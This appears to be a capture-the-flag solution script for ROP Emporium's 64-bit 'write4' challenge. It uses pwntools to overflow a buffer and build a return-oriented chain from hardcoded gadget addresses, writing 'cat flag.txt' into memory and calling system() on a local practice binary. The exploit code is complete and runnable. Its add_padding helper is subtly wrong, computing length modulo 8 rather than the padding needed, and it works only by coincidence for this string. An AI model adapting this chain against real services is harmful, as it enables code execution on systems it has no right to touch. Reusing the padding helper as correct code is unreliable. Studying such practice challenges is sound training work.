# https://ropemporium.com/challenge/write4.html
# This script is the solution for the 64-bit variant of the challenge.

import pwn

BUFFER = "A"*(40)
pop_rdi = 0x0000000000400893
data_loc = 0x00601050
system_addr = 0x00400810
pop_r14_pop_r15 = 0x0000000000400890
mov_r15_to_r14 = 0x0000000000400820


def add_padding(string):
    pad_len = len(string) % 8
    string += '\x00' * pad_len
    return string


def split_string_into_chunks_of_eight(string):
    return [string[i:i+8] for i in range(0, len(string), 8)]


def write_str_to_addr(addr_to_write_to, payload_string):
    """
    Writes a given string to a given address.
    If the string is longer than 8 bytes multiple write
    chains will be executed. Padding is added in order to align the string.
    """
    payload = add_padding(payload_string)
    rop = ""
    payload_chunks = split_string_into_chunks_of_eight(payload)
    for i in range(len(payload_chunks)):
        rop += pwn.p64(pop_r14_pop_r15)

        # the string's address, incremented per eight byte chunck.
        rop += pwn.p64(addr_to_write_to + (i * 8))
        # the string chunk,
        rop += payload_chunks[i]

        # the gadget that moves the chunk into the address.
        rop += pwn.p64(mov_r15_to_r14)

    return rop


def call_system_with_str(system_loc, string_loc):
    rop = ""
    rop += pwn.p64(pop_rdi)
    rop += pwn.p64(string_loc)
    rop += pwn.p64(system_loc)

    return rop


payload = (BUFFER + write_str_to_addr(data_loc, "cat flag.txt") +
           call_system_with_str(system_addr, data_loc))

pwn.context.log_level = 'debug'

# Use simple terminal or change this line.
pwn.context.terminal = ['st', '-e', 'sh', '-c']

# setting to debug would spawn the binary attached to GDB.
DEBUG = False
if DEBUG:
    proc = pwn.gdb.debug('./write4', """
    b *0x0000000000400804
    continue
    """)
else:
    proc = pwn.process(['./write4'])

proc.recvuntil(">")
proc.sendline(payload)
print(proc.recvuntil("}"))
